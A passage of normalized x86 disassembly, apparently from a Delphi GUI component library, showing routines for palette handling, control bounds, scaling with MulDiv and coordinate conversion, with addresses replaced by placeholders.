mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43bd4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bd54
lea eax [ ebp - 0x1c ]
call sub_403fa8
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
mov edx edi
mov eax [ ebx + 0x10 ]
mov si 0xffee
call sub_403454
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x7c ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x10 ]
mov ax [ eax + 0x84 ]
call sub_44c628
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408db8
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_403ffc
sub_43bd70
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_43bdd7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44923c
test al al
je r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
call sub_43cf20
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov edx [ eax + 0x64 ]
pop eax
call sub_4043b4
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bdde
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov al 0x1
sub_43bde4
push ebx
mov ebx eax
mov eax ebx
call sub_449264
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x50 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
pop edx
cmp dl [ eax + 0x6a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43be18
push ebx
mov ebx eax
mov eax ebx
call sub_4492b4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x80 ]
call sub_4043b4
je r-xdata
mov al 0x1
pop ebx
retn
sub_43be50
push ebx
mov ebx eax
mov eax ebx
call sub_4492f0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov al [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x57 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43be84
push ebx
mov ebx eax
mov eax ebx
call sub_41a31c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x120 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43beac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43cf50
sub_43becc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
sub_43beec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x80
mov edx esi
call sub_403ffc
sub_43bf10
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_43ce40
sub_43bf30
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x120 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x124 ] edx
sub_43bf5c
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov edi eax
mov eax [ edi + 0x74 ]
mov esi [ ebx + 0x18 ]
cmp eax [ esi + 0x158 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov edx [ edi + 0x78 ]
mov eax [ esi + 0x154 ]
call sub_4043b4
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov al [ edi + 0x70 ]
cmp al [ esi + 0x150 ]
je r-xdata
mov al 0x1
sub_43bfc0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43c89c
sub_43bfe0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_43c888
sub_43c000
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0x150 ] bl
sub_43c020
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419a2c
mov [ ebx + 0x3c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebx + 0x38 ] eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41cc44
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43cfd0
mov al [ r-xdata ]
mov [ ebx + 0x61 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43bb40
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_43de94
mov [ ebx + 0x70 ] 0xff000005
mov [ ebx + 0x57 ] 0x1
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x9a ] 0x1
mov [ ebx + 0x60 ] 0x1
mov [ ebx + 0x5e ] 0x0
mov [ ebx + 0x7a ] 0xfff4
mov eax [ r-xdata ]
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x150 ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_43c0f8
push ebx
push esi
push edi
add esp 0xfffffff0
call sub_4035e4
mov ebx edx
mov edi eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45ba30
mov eax [ edi + 0xa0 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035cc
push edi
xor ecx ecx
mov edx 0xb039
call sub_43e0d4
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx esp
mov eax edi
call sub_43c8c0
mov ecx esp
or edx 0xffffffff
mov eax edi
mov si 0xffcc
call sub_403454
xor eax eax
mov [ edi + 0xa0 ] eax
jmp r-xdata
mov eax [ edi + 0x6c ]
call sub_403258
xor eax eax
mov [ edi + 0x6c ] eax
mov eax [ edi + 0x74 ]
call sub_403258
mov eax [ edi + 0x68 ]
call sub_403258
mov eax [ edi + 0x64 ]
call sub_408928
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419a78
test bl bl
jle r-xdata
sub_43c1c4
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x30 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
sub_43c1ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] dl
mov ebp eax
xor ebx ebx
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov si 0xffd7
call sub_403454
mov edi eax
test edi edi
je r-xdata
lea edx [ esp + 0x4 ]
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
mov al [ esp ]
xor al 0x1
neg al
sbb eax eax
push eax
push edi
push esi
call SelectPalette
mov edi eax
push esi
call RealizePalette
test eax eax
je r-xdata
push 0xffffffff
push edi
push esi
call SelectPalette
push esi
mov eax [ esp + 0x8 ]
push eax
call ReleaseDC
mov bl 0x1
mov eax ebp
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43c274
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x61 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x61 ] al
mov eax ebx
call sub_43c574
sub_43c294
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
or [ ebx + 0x50 ] 0x8000
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov eax [ ebx + 0x6c ]
call sub_403258
xor eax eax
mov [ ebx + 0x6c ] eax
and [ ebx + 0x50 ] 0xffff7fff
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x6c ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_43eef0
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_403454
mov edx ebx
mov eax edi
call sub_419afc
mov eax ebx
mov si 0xffd9
call sub_403454
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x6c ] eax
pop edi
pop esi
pop ebx
retn
sub_43c35c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
or [ ebx + 0x54 ] 0x8
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_419e8c
and [ ebx + 0x54 ] 0xfff7
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43e0d4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43e0d4
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43e0d4
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax ebx
call sub_43e0d4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43e0d4
sub_43c3f0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419d48
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x7c ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp edi eax
jne r-xdata
xor edx edx
mov eax esi
call sub_43ced8
jmp r-xdata
xor edx edx
mov eax esi
call sub_43c294
sub_43c434
push ebx
push esi
push edi
push ecx
mov ebx edx
mov edi eax
mov al [ edi + 0x5b ]
cmp bl al
je r-xdata
mov eax edi
mov si 0xffd0
call sub_403454
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] al
mov [ edi + 0x5b ] bl
xor eax eax
mov al bl
mov dl [ eax + rw-data ]
mov eax edi
call sub_43c274
test [ edi + 0x1c ] 0x1
jne r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
cmp bl 0x6
je r-xdata
cmp [ edi + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x6
je r-xdata
mov al [ esp ]
dec eax
sub al 0x2
setb al
mov edx ebx
add dl 0xfd
sub dl 0x2
setb dl
cmp al dl
jne r-xdata
mov eax edi
mov si 0xffee
call sub_403454
mov al [ esp ]
test al al
je r-xdata
sub al 0x5
je r-xdata
test bl bl
je r-xdata
sub bl 0x5
je r-xdata
mov eax [ edi + 0x4c ]
push eax
mov eax [ edi + 0x48 ]
push eax
mov ecx [ edi + 0x44 ]
mov edx [ edi + 0x40 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_43c4dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea ecx [ ebp + 0x8 ]
lea edx [ ebp + 0xc ]
mov eax ebx
call sub_43e664
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp esi [ ebx + 0x40 ]
jne r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43d368
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43c574
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
push 0x0
xor ecx ecx
mov edx 0x47
mov eax ebx
call sub_43e0d4
mov eax ebx
mov si 0xffd0
call sub_403454
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov eax ebx
mov si 0xffcf
call sub_403454
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
sub_43c574
push ebx
push esi
add esp 0xfffffff0
mov esi eax
cmp [ esi + 0x62 ] 0x0
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
jne r-xdata
mov bl [ esi + 0x61 ]
mov al [ r-xdata ]
cmp al bl
jne r-xdata
test bl 0x4
je r-xdata
xor eax eax
mov [ esi + 0x90 ] eax
xor eax eax
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
sar eax 0x1
jns r-xdata
test bl 0x1
je r-xdata
add eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
adc eax 0x0
mov eax [ esi + 0x40 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x48 ]
mov [ esi + 0x88 ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
sar eax 0x1
jns r-xdata
test bl 0x2
je r-xdata
test bl 0x8
je r-xdata
add eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
adc eax 0x0
mov eax [ esi + 0x44 ]
mov [ esi + 0x8c ] eax
jmp r-xdata
mov eax [ esi + 0x4c ]
mov [ esi + 0x8c ] eax
jmp r-xdata
test [ ebx + 0x1c ] 0x2
je r-xdata
mov ebx [ esi + 0x30 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_443a0c
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x48 ]
mov [ esi + 0x90 ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x4c ]
mov [ esi + 0x94 ] eax
mov edx esp
mov eax [ esi + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ esi + 0x90 ] eax
mov eax [ esp + 0xc ]
mov [ esi + 0x94 ] eax
jmp r-xdata
mov eax [ ebx + 0x1fa ]
mov [ esi + 0x90 ] eax
mov eax [ ebx + 0x1fe ]
mov [ esi + 0x94 ] eax
jmp r-xdata
sub_43c690
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x1
pop esi
pop ebx
retn
sub_43c6b4
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
mov eax [ esi + 0x4c ]
push eax
mov ecx edx
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x2
pop esi
pop ebx
retn
sub_43c6dc
push ebx
push esi
mov esi eax
push edx
mov eax [ esi + 0x4c ]
push eax
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x4
pop esi
pop ebx
retn
sub_43c700
push ebx
push esi
mov esi eax
mov eax [ esi + 0x48 ]
push eax
push edx
mov ecx [ esi + 0x44 ]
mov eax esi
mov edx [ esi + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
or [ esi + 0x98 ] 0x8
pop esi
pop ebx
retn
sub_43c724
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xa0 ]
je r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x400
xor edx edx
push ebp
push sub_43c81f
push [ fs : edx ]
mov [ fs : edx ] esp
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa0 ]
cmp ebx eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov si 0xffe4
call sub_403454
test ebx ebx
je r-xdata
cmp [ eax + 0x178 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c826
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfbff
retn
mov edi eax
cmp ebx 0xffffffff
je r-xdata
cmp ebx 0xffffffff
je r-xdata
mov eax [ eax + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_414088
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0xa0 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa0 ] ebx
test ebx ebx
je r-xdata
cmp [ ebx + 0x178 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffbf
call sub_403454
test edi edi
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc5
call sub_403454
jmp r-xdata
mov eax [ ebx + 0x178 ]
mov edx [ ebp - 0x4 ]
call sub_413de8
sub_43c830
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
cmp esi [ ebx + 0x30 ]
je r-xdata
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43d368
mov edx edi
mov eax ebx
call sub_43c8e0
mov edx edi
mov eax ebx
call sub_43e178
jmp r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
cmp esi 0xffffffff
jne r-xdata
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43c89c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
lea eax [ ebx + 0x154 ]
mov edx esi
call sub_403ffc
pop esi
pop ebx
retn
mov [ ebx + 0x150 ] 0x0
sub_43c8e0
push ebx
push esi
push edi
push ebp
mov esi eax
mov eax [ edx + 0x8 ]
mov edi [ edx ]
sub eax edi
push eax
mov eax [ edx + 0xc ]
mov ebp [ edx + 0x4 ]
sub eax ebp
push eax
mov ecx ebp
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43c93c
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43c968
mov edx eax
mov ecx esp
mov eax esi
call sub_412ae8
mov edx esp
mov eax ebx
call sub_43cdac
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43c980
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_43c924
mov ecx esp
mov edx esi
call sub_412ae8
mov edx esp
mov eax ebx
call sub_43cdac
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43c9a8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43ca29
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x40 ]
add [ esi ] eax
mov eax [ ebx + 0x44 ]
add [ esi + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ca30
lea eax [ ebp - 0xc ]
call sub_403fa8
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
sub_43ca38
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
add eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
add eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43ca64
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ esi ]
sub eax [ esp ]
mov [ edi ] eax
mov eax [ esi + 0x4 ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x4 ] eax
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_43ca90
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
mov edx esi
mov eax ebx
call sub_457f84
sub_43cac0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebx + 0xa0 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx 0xb042
mov eax esi
call sub_43e0d4
sub_43cb3c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp ] ecx
mov edi edx
mov esi eax
cmp edi [ esp ]
je r-xdata
mov al [ r-xdata ]
mov [ esi + 0x98 ] al
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
test [ esi + 0x1c ] 0x1
je r-xdata
mov bl [ r-xdata ]
mov bl [ esi + 0x98 ]
jmp r-xdata
mov ebp [ esi + 0x40 ]
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
push eax
call MulDiv
mov ebp eax
jmp r-xdata
test bl 0x1
je r-xdata
mov eax [ esi + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0x4 ] eax
jmp r-xdata
test bl 0x2
je r-xdata
mov eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
test [ esi + 0x51 ] 0x1
jne r-xdata
test bl 0x4
je r-xdata
mov eax [ esi + 0x4c ]
mov [ esp + 0xc ] eax
test [ esi + 0x51 ] 0x2
jne r-xdata
test bl 0x1
je r-xdata
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x90 ]
push eax
call MulDiv
mov [ esi + 0x90 ] eax
test bl 0x8
setne dl
test al al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x48 ]
push eax
call MulDiv
mov [ esp + 0x8 ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x40 ]
add eax [ esi + 0x48 ]
push eax
call MulDiv
sub eax ebp
mov [ esp + 0x8 ] eax
jmp r-xdata
cmp [ esi + 0x59 ] 0x0
jne r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x94 ]
push eax
call MulDiv
mov [ esi + 0x94 ] eax
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
push eax
call MulDiv
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp ]
push eax
push edi
mov eax [ esi + 0x44 ]
add eax [ esi + 0x4c ]
push eax
call MulDiv
sub eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
jmp r-xdata
test bl 0x8
setne al
test al al
je r-xdata
test bl 0x10
je r-xdata
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x10 ]
push eax
mov ecx [ esp + 0xc ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov eax ebx
and al [ r-xdata ]
mov dl [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esp ]
push eax
push edi
mov ebx [ esi + 0x68 ]
mov eax ebx
call sub_41d09c
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_41d0b8
sub_43cd08
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_43cd9e
push [ fs : eax ]
mov [ fs : eax ] esp
test [ edi + 0x50 ] 0x20
je r-xdata
xor ebx ebx
jmp r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_419f84
test bl bl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
call sub_43cf20
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x8 ]
call sub_4043b4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cda5
lea eax [ ebp - 0x8 ]
call sub_403fa8
retn
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_43cf50
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
mov bl 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
test [ esi + 0x1c ] 0x1
je r-xdata
sub_43cdac
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x48 ]
sub eax [ esp + 0x10 ]
add eax [ esp ]
push eax
mov eax [ ebx + 0x4c ]
sub eax [ esp + 0x18 ]
add eax [ esp + 0x8 ]
push eax
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_43cdf4
push ebx
push esi
mov esi edx
mov ebx eax
